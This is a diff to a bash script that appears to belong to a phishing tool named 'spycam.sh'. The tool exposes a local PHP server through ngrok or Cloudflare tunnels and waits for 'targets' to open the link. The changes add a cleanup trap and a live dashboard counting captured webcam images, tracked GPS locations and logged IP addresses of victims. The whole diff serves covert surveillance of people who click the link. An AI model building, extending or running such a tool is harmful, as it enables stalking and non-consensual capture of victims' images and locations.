@@ -24,6 +24,33 @@ if [[ "$uname_all" == *"MINGW"* ]] || [[ "$uname_all" == *"MSYS"* ]] || [[ "$una
   }
 fi
 
+# Global variable for monitoring process
+monitoring_pid=""
+
+# Trap Ctrl+C to cleanup processes properly
+trap 'cleanup_and_exit' INT TERM
+
+cleanup_and_exit() {
+  printf "\n\e[1;93m[!] Shutting down...\e[0m\n"
+  
+  if [[ -n "$monitoring_pid" ]] && kill -0 "$monitoring_pid" 2>/dev/null; then
+    kill -9 "$monitoring_pid" 2>/dev/null || true
+  fi
+  
+  if [[ "$windows_mode" == true ]]; then
+    taskkill /F /IM "ngrok.exe" 2>/dev/null
+    taskkill /F /IM "php.exe" 2>/dev/null
+    taskkill /F /IM "cloudflared.exe" 2>/dev/null
+  else
+    pkill -f -2 ngrok >/dev/null 2>&1 || true
+    pkill -f -2 php >/dev/null 2>&1 || true
+    pkill -f -2 cloudflared >/dev/null 2>&1 || true
+  fi
+  
+  printf "\e[1;92m[\e[0m*\e[1;92m] All services stopped. Goodbye!\e[0m\n"
+  exit 0
+}
+
 require_command() {
   command -v "$1" >/dev/null 2>&1 || {
     echo >&2 "I require $1 but it's not installed. Install it. Aborting."
@@ -66,20 +93,6 @@ extract_tgz() {
   rm -f "$1"
 }
 
-stop() {
-  if [[ "$windows_mode" == true ]]; then
-    taskkill /F /IM "ngrok.exe" 2>/dev/null
-    taskkill /F /IM "php.exe" 2>/dev/null
-    taskkill /F /IM "cloudflared.exe" 2>/dev/null
-  else
-    pkill -f -2 ngrok >/dev/null 2>&1 || true
-    pkill -f -2 php >/dev/null 2>&1 || true
-    pkill -f -2 cloudflared >/dev/null 2>&1 || true
-  fi
-
-  exit 1
-}
-
 catch_ip() {
   ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
   IFS=$'\n'
@@ -120,12 +133,98 @@ catch_location() {
   fi
 }
 
+display_monitoring() {
+  local tunnel_link="$1"
+  local tunnel_type="$2"
+  
+  while true; do
+    clear
+    printf "\n\e[1;31;49;1m ✅ MONITORING (spycam.sh)\e[0m\n"
+    printf "\e[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
+    
+    # Check server status
+    if pgrep -x "php" > /dev/null; then
+      php_pid=$(pgrep -f 'php -S 127.0.0.1:3333' | head -1)
+      printf "\e[1;92m✓ Server running\e[0m (PID: %s)\n" "$php_pid"
+    else
+      printf "\e[1;91m✗ Server offline\e[0m\n"
+    fi
+    
+    # Check tunnel status - check both cloudflared and ngrok
+    if pgrep -f "cloudflared" > /dev/null 2>&1; then
+      printf "\e[1;92m✓ Tunnel active\e[0m (CloudFlare Tunnel)\n"
+      if [[ -n "$tunnel_link" ]]; then
+        printf "  URL: \e[1;77m%s\e[0m\n" "$tunnel_link"
+      fi
+    elif pgrep -f "ngrok" > /dev/null 2>&1; then
+      printf "\e[1;92m✓ Tunnel active\e[0m (Ngrok)\n"
+      if [[ -n "$tunnel_link" ]]; then
+        printf "  URL: \e[1;77m%s\e[0m\n" "$tunnel_link"
+      fi
+    else
+      printf "\e[1;91m✗ Tunnel offline\e[0m\n"
+    fi
+    
+    printf "\n\e[1;93m📊 Statistics:\e[0m\n"
+    
+    # Count total captures
+    if [[ -d "capture" ]]; then
+      capture_count=$(find capture -name "capture_*.png" 2>/dev/null | wc -l)
+      printf "\e[1;92m✓ Captures received: \e[0m\e[1;77m%d\e[0m images\n" "$capture_count"
+    else
+      printf "\e[1;92m✓ Captures received: \e[0m\e[1;77m0\e[0m images\n"
+    fi
+    
+    # Count total locations
+    if [[ -d "saved_locations" ]]; then
+      location_count=$(find saved_locations -name "location_*" 2>/dev/null | wc -l)
+      printf "\e[1;92m✓ Locations tracked: \e[0m\e[1;77m%d\e[0m locations\n" "$location_count"
+    else
+      printf "\e[1;92m✓ Locations tracked: \e[0m\e[1;77m0\e[0m locations\n"
+    fi
+    
+    # Count total IPs
+    if [[ -e "saved.ip.txt" ]]; then
+      ip_count=$(grep -c "IP:" saved.ip.txt 2>/dev/null)
+      printf "\e[1;92m✓ IPs logged: \e[0m\e[1;77m%d\e[0m addresses\n" "$ip_count"
+    else
+      printf "\e[1;92m✓ IPs logged: \e[0m\e[1;77m0\e[0m addresses\n"
+    fi
+    
+    printf "\n\e[1;93m📝 Recent Activity:\e[0m\n"
+    
+    # Show last 3 captures
+    if [[ -d "capture" ]]; then
+      recent_captures=$(find capture -name "capture_*.png" -type f -printf '%T@ %p\n' 2>/dev/null | sort -rn | head -3 | cut -d' ' -f2-)
+      if [[ -n "$recent_captures" ]]; then
+        printf "\e[1;92mLast captures:\e[0m\n"
+        echo "$recent_captures" | while read file; do
+          printf "  • %s\n" "$(basename "$file")"
+        done
+      fi
+    fi
+    
+    printf "\n\e[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\e[0m\n"
+    printf "\e[1;93m[!] Press Ctrl+C to stop monitoring | Updating every 3 seconds...\e[0m\n"
+    
+    sleep 3
+  done
+}
+
 checkfound() {
+  local tunnel_link="$1"
+  local tunnel_type="$2"
+  
   mkdir -p saved_locations
 
   printf "\n"
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
   printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] GPS Location tracking is \e[0m\e[1;93mACTIVE\e[0m\n"
+  
+  # Start monitoring display in background with link info
+  display_monitoring "$tunnel_link" "$tunnel_type" &
+  monitoring_pid=$!
+  
   while true; do
     if [[ -e "ip.txt" ]]; then
       printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
@@ -249,7 +348,7 @@ cloudflare_tunnel() {
   fi
 
   payload_cloudflare
-  checkfound
+  checkfound "$link" "CloudFlare"
 }
 
 payload_cloudflare() {
@@ -424,7 +523,7 @@ ngrok_server() {
   fi
 
   payload_ngrok
-  checkfound
+  checkfound "$link" "Ngrok"
 }
 payload_ngrok() {
   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
